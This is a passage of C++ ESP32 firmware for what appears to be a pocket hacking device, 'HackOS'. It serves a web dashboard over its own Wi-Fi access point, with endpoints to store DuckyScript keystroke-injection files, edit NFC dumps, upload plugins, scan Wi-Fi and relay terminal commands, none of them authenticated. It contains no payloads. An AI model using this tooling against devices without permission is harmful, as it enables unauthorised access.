h+='<input type="text" maxlength="2" value="'+nfcDump[off+i].toString(16).padStart(2,'0').toUpperCase()+'" data-off="'+(off+i)+'" style="width:24px;padding:2px;text-align:center;font-size:10px;background:#111;color:#00ff41;border:1px solid #333" onchange="nfcEdit(this)">';
}
h+='</div>';
}
h+='</div>';
}
el.innerHTML=h;
}
function nfcEdit(el){
let off=parseInt(el.dataset.off);let val=parseInt(el.value,16);
if(isNaN(val)||val<0||val>255){el.style.borderColor='#ff4141';return;}
el.style.borderColor='#00ff41';nfcDump[off]=val;
}
function nfcSave(){
if(!nfcDump){document.getElementById('nfc-log').textContent='No data loaded';return;}
let path=document.getElementById('nfc-path').value.trim();
if(!path){document.getElementById('nfc-log').textContent='Enter a file path';return;}
let hex='';for(let i=0;i<nfcDump.length;i++)hex+=nfcDump[i].toString(16).padStart(2,'0');
api('/api/nfc/write',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:path,hex:hex})}).then(function(d){
document.getElementById('nfc-log').textContent=d.ok?'Saved to '+path:'Error: '+(d.error||'unknown');
});
}
/* ── Remote Terminal ───────────────────────────────────────────────────── */
let termWs=null;
function initTerm(){
if(termWs&&termWs.readyState<=1)return;
let out=document.getElementById('term-output');
termWs=new WebSocket('ws://'+location.host+'/ws');
termWs.onopen=function(){out.textContent+='[Connected to HackOS Terminal]\\n';};
termWs.onmessage=function(e){
try{let m=JSON.parse(e.data);if(m.type==='term_out'){out.textContent+=m.text+'\\n';out.scrollTop=out.scrollHeight;}}catch(err){}
};
termWs.onerror=function(){out.textContent+='[WS Error]\\n';};
}
function termSend(){
let inp=document.getElementById('term-input');let cmd=inp.value.trim();
if(!cmd||!termWs)return;
document.getElementById('term-output').textContent+='> '+cmd+'\\n';
termWs.send(JSON.stringify({type:'term_cmd',cmd:cmd}));
inp.value='';
}
function termBtn(b){
if(!termWs)return;
termWs.send(JSON.stringify({type:'term_btn',btn:b}));
document.getElementById('term-output').textContent+='['+b.toUpperCase()+']\\n';
}
loadStatus();
</script>
</body>
</html>)rawhtml";

// ── Forward declarations for HTTP handlers ────────────────────────────────────

class RemoteDashboardApp;
static RemoteDashboardApp *g_dashApp = nullptr;

// ── HTTP handler signatures ──────────────────────────────────────────────────

static esp_err_t httpRootHandler(httpd_req_t *req);
static esp_err_t httpApiStatusHandler(httpd_req_t *req);
static esp_err_t httpApiAppsHandler(httpd_req_t *req);
static esp_err_t httpApiAppsLaunchHandler(httpd_req_t *req);
static esp_err_t httpApiFilesHandler(httpd_req_t *req);
static esp_err_t httpApiFilesDownloadHandler(httpd_req_t *req);
static esp_err_t httpApiDuckySaveHandler(httpd_req_t *req);
static esp_err_t httpApiWifiScanHandler(httpd_req_t *req);
static esp_err_t httpApiXpHandler(httpd_req_t *req);
static esp_err_t httpApiRfLiveHandler(httpd_req_t *req);
static esp_err_t httpApiPluginsHandler(httpd_req_t *req);
static esp_err_t httpApiPluginsUploadHandler(httpd_req_t *req);
static esp_err_t httpApiPluginsToggleHandler(httpd_req_t *req);
static esp_err_t httpApiPluginsDeleteHandler(httpd_req_t *req);
static esp_err_t httpApiPluginsReloadHandler(httpd_req_t *req);
static esp_err_t httpApiAssetsHandler(httpd_req_t *req);
static esp_err_t httpApiAssetsDeployHandler(httpd_req_t *req);
static esp_err_t httpApiSystemStatsHandler(httpd_req_t *req);
static esp_err_t httpApiScreenshotHandler(httpd_req_t *req);
static esp_err_t httpApiNfcWriteHandler(httpd_req_t *req);

// ═══════════════════════════════════════════════════════════════════════════════
// RemoteDashboardApp
// ═══════════════════════════════════════════════════════════════════════════════

class RemoteDashboardApp : public AppBase
{
public:
    // ── State enum ───────────────────────────────────────────────────────
    enum class UiState : uint8_t
    {
        MENU_MAIN,
        DASHBOARD_RUNNING,
    };

    RemoteDashboardApp() = default;
    ~RemoteDashboardApp() override = default;

    // ── AppBase interface ────────────────────────────────────────────────

    void onSetup() override
    {
        state_ = UiState::MENU_MAIN;
        menuSel_ = 0U;
        serverRunning_ = false;
        httpServer_ = nullptr;
        connectedClients_ = 0U;
        g_dashApp = this;
        ESP_LOGI(TAG_RD, "Remote Dashboard app started");
    }

    void onLoop() override
    {
        if (serverRunning_)
        {
            refreshClientCount();
        }
    }

    void onDraw() override
    {
        auto &disp = DisplayManager::instance();
        disp.clear();

        switch (state_)
        {
        case UiState::MENU_MAIN:
            drawMenu(disp);
            break;
        case UiState::DASHBOARD_RUNNING:
            drawDashboardStatus(disp);
            break;
        }

        disp.present();
    }

    void onEvent(Event *event) override
    {
        if (event == nullptr || event->type != EventType::EVT_INPUT)
        {
            return;
        }

        const int32_t input = event->arg0;

        switch (state_)
        {
        case UiState::MENU_MAIN:
            handleMenuInput(input);
            break;
        case UiState::DASHBOARD_RUNNING:
            handleDashboardInput(input);
            break;
        }
    }

    void onDestroy() override
    {
        stopDashboard();
        g_dashApp = nullptr;
        ESP_LOGI(TAG_RD, "Remote Dashboard app destroyed");
    }

private:
    // ── Menu drawing ─────────────────────────────────────────────────────

    void drawMenu(DisplayManager &disp)
    {
        disp.drawText(0, 0, "Web Dashboard");
        disp.drawLine(0, 10, 127, 10);

        for (size_t i = 0U; i < MAIN_MENU_COUNT; ++i)
        {
            const int y = 14 + static_cast<int>(i) * 10;
            if (i == menuSel_)
            {
                disp.fillRect(0, y - 1, 128, 9);
                disp.drawText(4, y, MAIN_MENU_LABELS[i], 1U, 0U);
            }
            else
            {
                disp.drawText(4, y, MAIN_MENU_LABELS[i]);
            }
        }
    }

    void drawDashboardStatus(DisplayManager &disp)
    {
        disp.drawText(0, 0, "Dashboard Active");
        disp.drawLine(0, 10, 127, 10);

        char buf[64];
        snprintf(buf, sizeof(buf), "SSID: %s", AP_SSID);
        disp.drawText(0, 14, buf);

        snprintf(buf, sizeof(buf), "Pass: %s", AP_PASS);
        disp.drawText(0, 24, buf);

        disp.drawText(0, 34, "IP: 192.168.4.1");

        snprintf(buf, sizeof(buf), "Clients: %u", connectedClients_);
        disp.drawText(0, 44, buf);

        disp.drawText(0, 56, "[BACK] to stop");
    }

    // ── Input handlers ───────────────────────────────────────────────────

    void handleMenuInput(int32_t input)
    {
        constexpr int32_t INPUT_UP    = 1;
        constexpr int32_t INPUT_DOWN  = 2;
        constexpr int32_t INPUT_PRESS = 4;
        constexpr int32_t INPUT_BACK  = 5;

        if (input == INPUT_UP && menuSel_ > 0U)
        {
            --menuSel_;
        }
        else if (input == INPUT_DOWN && menuSel_ < MAIN_MENU_COUNT - 1U)
        {
            ++menuSel_;
        }
        else if (input == INPUT_PRESS)
        {
            switch (menuSel_)
            {
            case 0U: // Start Dashboard
                startDashboard();
                break;
            case 1U: // Stop Dashboard
                stopDashboard();
                break;
            case 2U: // Back
                EventSystem::instance().postEvent({EventType::EVT_SYSTEM, SYSTEM_EVENT_BACK, 0, nullptr});
                break;
            }
        }
        else if (input == INPUT_BACK)
        {
            EventSystem::instance().postEvent({EventType::EVT_SYSTEM, SYSTEM_EVENT_BACK, 0, nullptr});
        }
    }

    void handleDashboardInput(int32_t input)
    {
        constexpr int32_t INPUT_BACK  = 5;
        constexpr int32_t INPUT_PRESS = 4;

        if (input == INPUT_BACK || input == INPUT_PRESS)
        {
            state_ = UiState::MENU_MAIN;
        }
    }

    // ── Dashboard lifecycle ──────────────────────────────────────────────

    void startDashboard()
    {
        if (serverRunning_)
        {
            ESP_LOGW(TAG_RD, "Dashboard already running");
            state_ = UiState::DASHBOARD_RUNNING;
            return;
        }

        // Start SoftAP
        WiFi.mode(WIFI_AP);
        WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL, 0, AP_MAX_CONN);
        ESP_LOGI(TAG_RD, "SoftAP started: SSID=%s IP=%s", AP_SSID,
                 WiFi.softAPIP().toString().c_str());

        // Start HTTP server
        if (startHttpServer())
        {
            serverRunning_ = true;
            state_ = UiState::DASHBOARD_RUNNING;

            // Award XP for starting the dashboard
            EventSystem::instance().postEvent(
                {EventType::EVT_XP_EARNED, XP_DASHBOARD_OP, 0, nullptr});
        }
        else
        {
            WiFi.softAPdisconnect(true);
            ESP_LOGE(TAG_RD, "Failed to start HTTP server");
        }
    }

    void stopDashboard()
    {
        stopHttpServer();
        if (serverRunning_)
        {
            WiFi.softAPdisconnect(true);
            serverRunning_ = false;
            ESP_LOGI(TAG_RD, "Dashboard stopped");
        }
    }

    // ── HTTP server ──────────────────────────────────────────────────────

    bool startHttpServer()
    {
        httpd_config_t config = HTTPD_DEFAULT_CONFIG();
        config.max_uri_handlers = HTTPD_MAX_URI;
        config.stack_size = HTTPD_STACK_SIZE;
        config.lru_purge_enable = true;

        esp_err_t err = httpd_start(&httpServer_, &config);
        if (err != ESP_OK)
        {
            ESP_LOGE(TAG_RD, "httpd_start failed: %d", err);
            httpServer_ = nullptr;
            return false;
        }

        // Register all API endpoints
        registerRoute("/",                    HTTP_GET,  httpRootHandler);
        registerRoute("/api/status",          HTTP_GET,  httpApiStatusHandler);
        registerRoute("/api/apps",            HTTP_GET,  httpApiAppsHandler);
        registerRoute("/api/apps/launch",     HTTP_POST, httpApiAppsLaunchHandler);
        registerRoute("/api/files",           HTTP_GET,  httpApiFilesHandler);
        registerRoute("/api/files/download",  HTTP_GET,  httpApiFilesDownloadHandler);
        registerRoute("/api/ducky/save",      HTTP_POST, httpApiDuckySaveHandler);
        registerRoute("/api/wifi/scan",       HTTP_POST, httpApiWifiScanHandler);
        registerRoute("/api/xp",              HTTP_GET,  httpApiXpHandler);
        registerRoute("/api/rf/live",         HTTP_GET,  httpApiRfLiveHandler);
        registerRoute("/api/plugins",          HTTP_GET,  httpApiPluginsHandler);
        registerRoute("/api/plugins/upload",   HTTP_POST, httpApiPluginsUploadHandler);
        registerRoute("/api/plugins/toggle",   HTTP_POST, httpApiPluginsToggleHandler);
        registerRoute("/api/plugins/delete",   HTTP_POST, httpApiPluginsDeleteHandler);
        registerRoute("/api/plugins/reload",   HTTP_POST, httpApiPluginsReloadHandler);
        registerRoute("/api/assets",            HTTP_GET,  httpApiAssetsHandler);
        registerRoute("/api/assets/deploy",     HTTP_POST, httpApiAssetsDeployHandler);
        registerRoute("/api/system/stats",      HTTP_GET,  httpApiSystemStatsHandler);
        registerRoute("/api/ui/screenshot",     HTTP_POST, httpApiScreenshotHandler);
        registerRoute("/api/nfc/write",         HTTP_POST, httpApiNfcWriteHandler);

        // Register WebSocket endpoint
        hackos::net::WebSocketServer::instance().start(httpServer_, "/ws");

        ESP_LOGI(TAG_RD, "HTTP server started with %d endpoints", 21);
        return true;
    }

    void registerRoute(const char *uri, httpd_method_t method,
                       esp_err_t (*handler)(httpd_req_t *))
    {
        const httpd_uri_t route = {
            uri, method, handler, nullptr
#ifdef CONFIG_HTTPD_WS_SUPPORT
            , false, false, nullptr
#endif
        };
        (void)httpd_register_uri_handler(httpServer_, &route);
    }

    void stopHttpServer()
    {
        if (httpServer_ != nullptr)
        {
            httpd_stop(httpServer_);
            httpServer_ = nullptr;
            ESP_LOGI(TAG_RD, "HTTP server stopped");
        }
    }

    // ── Client tracking ──────────────────────────────────────────────────

    void refreshClientCount()
    {
        wifi_sta_list_t staList = {};
        if (esp_wifi_ap_get_sta_list(&staList) == ESP_OK)
        {
            connectedClients_ = static_cast<uint8_t>(staList.num);
        }
    }

    // ── Member variables ─────────────────────────────────────────────────

    UiState state_         = UiState::MENU_MAIN;
    size_t menuSel_        = 0U;
    bool serverRunning_    = false;
    httpd_handle_t httpServer_ = nullptr;
    uint8_t connectedClients_  = 0U;
};

// ═══════════════════════════════════════════════════════════════════════════════
// HTTP Handlers
// ═══════════════════════════════════════════════════════════════════════════════

/// Serve the embedded SPA dashboard.
static esp_err_t httpRootHandler(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, DASHBOARD_HTML, sizeof(DASHBOARD_HTML) - 1);
}

/// GET /api/status – system status JSON.
static esp_err_t httpApiStatusHandler(httpd_req_t *req)
{
    const uint32_t freeHeap  = ESP.getFreeHeap();
    const uint32_t totalHeap = ESP.getHeapSize();
    const uint32_t usedPct   = (totalHeap > 0U)
        ? static_cast<uint32_t>((static_cast<uint64_t>(totalHeap - freeHeap) * 100ULL) / totalHeap)
        : 0U;
    const uint32_t uptimeMs  = static_cast<uint32_t>(millis());
    const size_t appCount    = AppManager::instance().appCount();

    char json[JSON_BUF_SIZE];
    snprintf(json, sizeof(json),
             "{\"free_heap\":%lu,\"total_heap\":%lu,\"heap_usage_pct\":%lu,"
             "\"uptime_ms\":%lu,\"app_count\":%u}",
             static_cast<unsigned long>(freeHeap),
             static_cast<unsigned long>(totalHeap),
             static_cast<unsigned long>(usedPct),
             static_cast<unsigned long>(uptimeMs),
             static_cast<unsigned>(appCount));

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, json, strlen(json));
}

/// GET /api/apps – list registered app names.
static esp_err_t httpApiAppsHandler(httpd_req_t *req)
{
    auto &mgr = AppManager::instance();
    const size_t count = mgr.appCount();

    char json[JSON_BUF_SIZE];
    size_t offset = 0U;
    offset += snprintf(json + offset, sizeof(json) - offset, "{\"apps\":[");

    for (size_t i = 0U; i < count && offset < sizeof(json) - 32U; ++i)
    {
        const char *name = mgr.appNameAt(i);
        if (i > 0U)
        {
            offset += snprintf(json + offset, sizeof(json) - offset, ",");
        }
        offset += snprintf(json + offset, sizeof(json) - offset, "\"%s\"", name ? name : "");
    }
    offset += snprintf(json + offset, sizeof(json) - offset, "]}");

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, json, offset);
}

/// POST /api/apps/launch – launch an app by name.
static esp_err_t httpApiAppsLaunchHandler(httpd_req_t *req)
{
    char buf[256];
    int received = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (received <= 0)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"no body\"}", 19);
    }
    buf[received] = '\0';

    // Simple JSON parse for "name" field
    const char *nameKey = strstr(buf, "\"name\"");
    if (nameKey == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"missing name\"}", 23);
    }

    const char *valStart = strchr(nameKey + 6, '"');
    if (valStart == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad format\"}", 21);
    }
    ++valStart;
    const char *valEnd = strchr(valStart, '"');
    if (valEnd == nullptr || (valEnd - valStart) >= 64)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad name\"}", 20);
    }

    char appName[64];
    size_t nameLen = static_cast<size_t>(valEnd - valStart);
    memcpy(appName, valStart, nameLen);
    appName[nameLen] = '\0';

    // Post an event to launch the app (handled by AppManager in main loop)
    Event evt = {};
    evt.type = EventType::EVT_REMOTE_CMD;
    evt.arg0 = 1; // launch-app command
    // Find app index
    auto &mgr = AppManager::instance();
    bool found = false;
    for (size_t i = 0U; i < mgr.appCount(); ++i)
    {
        if (strcmp(mgr.appNameAt(i), appName) == 0)
        {
            evt.arg1 = static_cast<int32_t>(i);
            found = true;
            break;
        }
    }

    if (!found)
    {
        httpd_resp_set_type(req, "application/json");
        char errJson[128];
        snprintf(errJson, sizeof(errJson), "{\"error\":\"app not found: %s\"}", appName);
        return httpd_resp_send(req, errJson, strlen(errJson));
    }

    EventSystem::instance().postEvent(evt);

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"ok\":true}", 11);
}

/// GET /api/files?path=... – list directory contents.
static esp_err_t httpApiFilesHandler(httpd_req_t *req)
{
    // Parse query string for "path" parameter
    char queryBuf[256] = {};
    char pathParam[128] = "/ext";

    if (httpd_req_get_url_query_len(req) > 0 &&
        httpd_req_get_url_query_str(req, queryBuf, sizeof(queryBuf)) == ESP_OK)
    {
        httpd_query_key_value(queryBuf, "path", pathParam, sizeof(pathParam));
    }

    // Validate path starts with /ext to prevent directory traversal
    if (strncmp(pathParam, "/ext", 4) != 0)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"path must start with /ext\"}", 36);
    }

    // Reject path traversal attempts
    if (strstr(pathParam, "..") != nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"invalid path\"}", 23);
    }

    auto &vfs = hackos::storage::VirtualFS::instance();
    hackos::storage::VirtualFS::DirEntry entries[MAX_DIR_ENTRIES];
    size_t count = vfs.listDir(pathParam, entries, MAX_DIR_ENTRIES);

    char json[JSON_BUF_SIZE];
    size_t offset = 0U;
    offset += snprintf(json + offset, sizeof(json) - offset,
                       "{\"path\":\"%s\",\"entries\":[", pathParam);

    for (size_t i = 0U; i < count && offset < sizeof(json) - 128U; ++i)
    {
        if (i > 0U)
        {
            offset += snprintf(json + offset, sizeof(json) - offset, ",");
        }
        offset += snprintf(json + offset, sizeof(json) - offset,
                           "{\"name\":\"%s\",\"is_dir\":%s,\"size\":%lu}",
                           entries[i].name,
                           entries[i].isDir ? "true" : "false",
                           static_cast<unsigned long>(entries[i].size));
    }
    offset += snprintf(json + offset, sizeof(json) - offset, "]}");

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, json, offset);
}

/// GET /api/files/download?path=... – download a file from SD.
static esp_err_t httpApiFilesDownloadHandler(httpd_req_t *req)
{
    char queryBuf[256] = {};
    char pathParam[128] = {};

    if (httpd_req_get_url_query_len(req) > 0 &&
        httpd_req_get_url_query_str(req, queryBuf, sizeof(queryBuf)) == ESP_OK)
    {
        httpd_query_key_value(queryBuf, "path", pathParam, sizeof(pathParam));
    }

    if (pathParam[0] == '\0')
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"path required\"}", 24);
    }

    // Validate path starts with /ext
    if (strncmp(pathParam, "/ext", 4) != 0)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"path must start with /ext\"}", 36);
    }

    // Reject path traversal
    if (strstr(pathParam, "..") != nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"invalid path\"}", 23);
    }

    auto &vfs = hackos::storage::VirtualFS::instance();
    fs::File file = vfs.open(pathParam, "r");
    if (!file)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"file not found\"}", 25);
    }

    httpd_resp_set_type(req, "application/octet-stream");

    // Set Content-Disposition header with filename
    const char *filename = strrchr(pathParam, '/');
    if (filename != nullptr)
    {
        ++filename;
    }
    else
    {
        filename = pathParam;
    }
    char disposition[128];
    snprintf(disposition, sizeof(disposition),
             "attachment; filename=\"%s\"", filename);
    httpd_resp_set_hdr(req, "Content-Disposition", disposition);

    // Stream file in chunks
    char buf[FILE_BUF_SIZE];
    size_t bytesRead;
    while ((bytesRead = file.read(reinterpret_cast<uint8_t *>(buf),
                                  sizeof(buf))) > 0)
    {
        if (httpd_resp_send_chunk(req, buf, bytesRead) != ESP_OK)
        {
            file.close();
            httpd_resp_send_chunk(req, nullptr, 0);
            return ESP_FAIL;
        }
    }
    file.close();

    // End chunked response
    return httpd_resp_send_chunk(req, nullptr, 0);
}

/// POST /api/ducky/save – save a DuckyScript to /ext/badbt/.
static esp_err_t httpApiDuckySaveHandler(httpd_req_t *req)
{
    char buf[POST_BUF_MAX];
    int received = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (received <= 0)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"no body\"}", 19);
    }
    buf[received] = '\0';

    // Parse "filename" and "content" from JSON
    const char *fnKey = strstr(buf, "\"filename\"");
    const char *ctKey = strstr(buf, "\"content\"");
    if (fnKey == nullptr || ctKey == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"missing fields\"}", 25);
    }

    // Extract filename
    const char *fnStart = strchr(fnKey + 10, '"');
    if (fnStart == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad filename\"}", 23);
    }
    ++fnStart;
    const char *fnEnd = strchr(fnStart, '"');
    if (fnEnd == nullptr || (fnEnd - fnStart) >= 64)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad filename\"}", 23);
    }

    char filename[64];
    size_t fnLen = static_cast<size_t>(fnEnd - fnStart);
    memcpy(filename, fnStart, fnLen);
    filename[fnLen] = '\0';

    // Validate filename: no path separators or traversal
    if (strchr(filename, '/') != nullptr || strchr(filename, '\\') != nullptr ||
        strstr(filename, "..") != nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"invalid filename\"}", 27);
    }

    // Extract content
    const char *ctStart = strchr(ctKey + 9, '"');
    if (ctStart == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad content\"}", 22);
    }
    ++ctStart;
    // Find end quote (handle escaped quotes)
    const char *ctEnd = ctStart;
    while (*ctEnd != '\0')
    {
        if (*ctEnd == '\\' && *(ctEnd + 1) != '\0')
        {
            ctEnd += 2;
            continue;
        }
        if (*ctEnd == '"')
        {
            break;
        }
        ++ctEnd;
    }

    size_t contentLen = static_cast<size_t>(ctEnd - ctStart);

    // Build path: /ext/badbt/<filename>
    char path[128];
    snprintf(path, sizeof(path), "/ext/badbt/%s", filename);

    auto &vfs = hackos::storage::VirtualFS::instance();
    fs::File file = vfs.open(path, "w");
    if (!file)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"write failed\"}", 23);
    }
    file.write(reinterpret_cast<const uint8_t *>(ctStart), contentLen);
    file.close();

    ESP_LOGI(TAG_RD, "Saved DuckyScript: %s (%u bytes)", path,
             static_cast<unsigned>(contentLen));

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"ok\":true}", 11);
}

/// POST /api/wifi/scan – trigger a WiFi scan event.
static esp_err_t httpApiWifiScanHandler(httpd_req_t *req)
{
    Event evt = {};
    evt.type = EventType::EVT_REMOTE_CMD;
    evt.arg0 = 2; // wifi-scan command
    EventSystem::instance().postEvent(evt);

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"ok\":true}", 11);
}

/// GET /api/xp – get current XP/level info.
static esp_err_t httpApiXpHandler(httpd_req_t *req)
{
    auto &xp = ExperienceManager::instance();

    char json[256];
    snprintf(json, sizeof(json),
             "{\"level\":%u,\"xp\":%lu,\"xp_next\":%lu,\"hack_points\":%lu}",
             static_cast<unsigned>(xp.level()),
             static_cast<unsigned long>(xp.xp()),
             static_cast<unsigned long>(xp.xpForNextLevel()),
             static_cast<unsigned long>(xp.hackPoints()));

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, json, strlen(json));
}

/// GET /api/rf/live – Server-Sent Events stream for RF data.
static esp_err_t httpApiRfLiveHandler(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/event-stream");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache");
    httpd_resp_set_hdr(req, "Connection", "keep-alive");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");

    // Send simulated RF data points (real implementation would read
    // from the RF transceiver ring buffer)
    for (int i = 0; i < SSE_RF_SAMPLE_COUNT; ++i)
    {
        int rssi = SSE_RF_RSSI_BASE - static_cast<int>(esp_random() % SSE_RF_RSSI_RANGE);
        int freq  = SSE_RF_BASE_FREQ_MHZ + static_cast<int>(esp_random() % SSE_RF_FREQ_RANGE_MHZ);
        const char *proto = (esp_random() % 2 == 0) ? "OOK" : "FSK";

        char sseData[128];
        int len = snprintf(sseData, sizeof(sseData),
                           "data: {\"rssi\":%d,\"freq\":%d,\"proto\":\"%s\"}\n\n",
                           rssi, freq, proto);

        if (httpd_resp_send_chunk(req, sseData, len) != ESP_OK)
        {
            break;
        }

        vTaskDelay(pdMS_TO_TICKS(SSE_UPDATE_INTERVAL_MS));
    }

    // End SSE stream
    return httpd_resp_send_chunk(req, nullptr, 0);
}

// ═══════════════════════════════════════════════════════════════════════════════
// Plugin API Handlers
// ═══════════════════════════════════════════════════════════════════════════════

/// GET /api/plugins – list all loaded plugins.
static esp_err_t httpApiPluginsHandler(httpd_req_t *req)
{
    auto &pm = hackos::core::PluginManager::instance();
    const size_t count = pm.pluginCount();

    // Use a larger buffer for plugin data
    static constexpr size_t PLUGIN_JSON_SIZE = 4096U;
    char json[PLUGIN_JSON_SIZE];
    size_t offset = 0U;
    offset += snprintf(json + offset, sizeof(json) - offset, "{\"plugins\":[");

    for (size_t i = 0U; i < count && offset < sizeof(json) - 256U; ++i)
    {
        const auto *info = pm.pluginAt(i);
        if (info == nullptr)
        {
            continue;
        }

        if (i > 0U)
        {
            offset += snprintf(json + offset, sizeof(json) - offset, ",");
        }

        offset += snprintf(json + offset, sizeof(json) - offset,
                           "{\"name\":\"%s\",\"label\":\"%s\",\"version\":\"%s\","
                           "\"author\":\"%s\",\"description\":\"%s\","
                           "\"category\":\"%s\",\"enabled\":%s,\"actions\":%u}",
                           info->name, info->label, info->version,
                           info->author, info->description,
                           info->category,
                           info->enabled ? "true" : "false",
                           static_cast<unsigned>(info->actionCount));
    }
    offset += snprintf(json + offset, sizeof(json) - offset, "]}");

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, json, offset);
}

/// POST /api/plugins/upload – upload a plugin JSON file to /ext/plugins/.
static esp_err_t httpApiPluginsUploadHandler(httpd_req_t *req)
{
    char buf[POST_BUF_MAX];
    int received = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (received <= 0)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"no body\"}", 19);
    }
    buf[received] = '\0';

    // Parse "filename" and "content"
    const char *fnKey = strstr(buf, "\"filename\"");
    const char *ctKey = strstr(buf, "\"content\"");
    if (fnKey == nullptr || ctKey == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"missing fields\"}", 25);
    }

    // Extract filename
    const char *fnStart = strchr(fnKey + 10, '"');
    if (fnStart == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad filename\"}", 23);
    }
    ++fnStart;
    const char *fnEnd = strchr(fnStart, '"');
    if (fnEnd == nullptr || (fnEnd - fnStart) >= 60)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad filename\"}", 23);
    }

    char filename[64];
    size_t fnLen = static_cast<size_t>(fnEnd - fnStart);
    memcpy(filename, fnStart, fnLen);
    filename[fnLen] = '\0';

    // Validate filename
    if (strchr(filename, '/') != nullptr || strchr(filename, '\\') != nullptr ||
        strstr(filename, "..") != nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"invalid filename\"}", 27);
    }

    // Must end with .json
    size_t nameLen = strlen(filename);
    if (nameLen < 6 || strcmp(filename + nameLen - 5, ".json") != 0)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"must be .json\"}", 24);
    }

    // Extract content (everything between "content":"..." )
    const char *ctStart = strchr(ctKey + 9, '"');
    if (ctStart == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad content\"}", 22);
    }
    ++ctStart;
    const char *ctEnd = ctStart;
    while (*ctEnd != '\0')
    {
        if (*ctEnd == '\\' && *(ctEnd + 1) != '\0')
        {
            ctEnd += 2;
            continue;
        }
        if (*ctEnd == '"')
        {
            break;
        }
        ++ctEnd;
    }
    size_t contentLen = static_cast<size_t>(ctEnd - ctStart);

    char path[128];
    snprintf(path, sizeof(path), "/ext/plugins/%s", filename);

    auto &vfs = hackos::storage::VirtualFS::instance();
    fs::File file = vfs.open(path, "w");
    if (!file)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"write failed\"}", 23);
    }
    file.write(reinterpret_cast<const uint8_t *>(ctStart), contentLen);
    file.close();

    ESP_LOGI(TAG_RD, "Saved plugin: %s (%u bytes)", path,
             static_cast<unsigned>(contentLen));

    // Reload plugins
    hackos::core::PluginManager::instance().reload();

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"ok\":true}", 11);
}

/// POST /api/plugins/toggle – enable/disable a plugin.
static esp_err_t httpApiPluginsToggleHandler(httpd_req_t *req)
{
    char buf[256];
    int received = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (received <= 0)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"no body\"}", 19);
    }
    buf[received] = '\0';

    // Parse name and enabled
    const char *nameKey = strstr(buf, "\"name\"");
    if (nameKey == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"missing name\"}", 23);
    }

    const char *valStart = strchr(nameKey + 6, '"');
    if (valStart == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad format\"}", 21);
    }
    ++valStart;
    const char *valEnd = strchr(valStart, '"');
    if (valEnd == nullptr || (valEnd - valStart) >= 32)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad name\"}", 20);
    }

    char pluginName[32];
    size_t pnLen = static_cast<size_t>(valEnd - valStart);
    memcpy(pluginName, valStart, pnLen);
    pluginName[pnLen] = '\0';

    bool enabled = (strstr(buf, "\"enabled\":true") != nullptr);

    auto &pm = hackos::core::PluginManager::instance();
    if (pm.setEnabled(pluginName, enabled))
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"ok\":true}", 11);
    }

